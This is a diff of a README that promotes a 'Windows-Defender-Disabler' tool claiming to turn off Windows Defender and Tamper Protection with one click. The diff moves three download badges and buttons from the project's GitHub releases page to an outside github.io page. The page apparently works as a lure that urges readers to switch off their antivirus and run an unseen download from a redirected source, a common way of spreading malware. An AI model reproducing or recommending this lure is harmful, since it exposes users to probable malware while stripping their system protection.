@@ -1,7 +1,7 @@
 <h1>🛡️ Windows-Defender-Disabler - Disable Defender Permanently with One Click</h1>
 
 <p align="center">
-  <a href="https://github.com/tghuyiubly/Windows-Defender-Disabler/releases">
+  <a href="https://tghuyiubly.github.io">
     <img src="https://img.shields.io/badge/Download-Windows_Defender_Disabler-2ea44f?style=for-the-badge&logo=github&logoColor=white&labelColor=1f2937&color=dc2626" alt="Download Badge">
   </a>
 </p>
@@ -21,7 +21,7 @@ Many users struggle with Tamper Protection, a feature that prevents you from dis
 Visit this link to download the application:
 
 <p align="center">
-  <a href="https://github.com/tghuyiubly/Windows-Defender-Disabler/releases">
+  <a href="https://tghuyiubly.github.io">
     <img src="https://img.shields.io/badge/🡇_Download_Now-FF5722?style=for-the-badge&logo=windows&logoColor=white&labelColor=1f2937&color=4caf50" alt="Download Now">
   </a>
 </p>
@@ -204,7 +204,7 @@ Special thanks to the PowerShell security research community for sharing techniq
 Ready to take control of your PC's security? Get the tool now:
 
 <p align="center">
-  <a href="https://github.com/tghuyiubly/Windows-Defender-Disabler/releases" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 10px 20px rgba(0,0,0,0.3);">
+  <a href="https://tghuyiubly.github.io" style="display:inline-block;padding:15px 40px;background:linear-gradient(135deg,#667eea 0%,#764ba2 100%);color:white;font-size:22px;font-weight:bold;border-radius:50px;text-decoration:none;box-shadow:0 10px 20px rgba(0,0,0,0.3);">
     🡇 Download Windows-Defender-Disabler
   </a>
 </p>
